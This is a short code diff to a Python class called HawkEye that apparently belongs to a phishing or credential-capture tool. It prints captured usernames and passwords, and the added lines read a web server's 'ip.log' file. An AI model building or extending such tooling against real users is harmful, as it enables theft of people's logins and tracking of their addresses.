@@ -185,6 +185,9 @@ class HawkEye(object):
                             f"[{BLUE}Username{DEFAULT}] {username}\n"
                             f"[{BLUE}Password{DEFAULT}] {password}"
                         )
+
+                with open('Server/www/ip.log') as headers:
+                    data_blob = headers.read() 
                         
 if __name__ == '__main__':
     
